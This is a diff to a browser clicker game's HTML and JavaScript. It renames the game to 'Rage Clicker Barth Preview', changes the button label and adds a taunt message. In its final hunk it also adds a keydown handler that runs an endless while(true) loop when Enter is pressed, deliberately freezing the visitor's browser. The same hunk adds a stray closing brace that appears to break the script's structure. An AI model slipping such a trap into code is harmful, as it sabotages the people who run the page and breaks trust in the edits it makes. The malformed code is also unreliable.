@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rage Clicker Pro Max</title>
+<title>Rage Clicker Barth Preview</title>
 <style>
     body {
         font-family: Arial, sans-serif;
@@ -63,8 +63,8 @@
 </style>
 </head>
 <body>
-<h1 style="margin-top:160px;">Rage Clicker Pro Max</h1>
-<button id="clickButton">Click me!</button>
+<h1 style="margin-top:160px;">Rage Clicker Barth Preview</h1>
+<button id="clickButton">Pet Barth!</button>
 <div id="score">Score: 0</div>
 <div id="streak">Streak: 0</div>
 <div id="highScore">High Score: 0</div>
@@ -92,7 +92,7 @@ const failSound = document.getElementById('failSound');
 
 const messages = [
     "Are you sure?", "Clicking again? Brave choice!", "One more click won't hurt...",
-    "Think twice!", "Do it if you dare!"
+    "Think twice!", "Do it if you dare!", "BARTH BARTH BARTH BARTH BARTH"
 ];
 const tauntMessages = [
     "Haha, missed me!", "Too slow!", "You'll never catch me!", 
@@ -230,6 +230,15 @@ button.addEventListener('click', () => {
 
     updateDisplays();
     updateLeaderboard(score);
+
+    }
+
+    document.addEventListener('keydown', function(event) {
+    if (event.key === 'Enter') {
+        while(true) {
+            console.log("This will freeze the browser");
+        }
+    }
 });
 
 // Initial setup
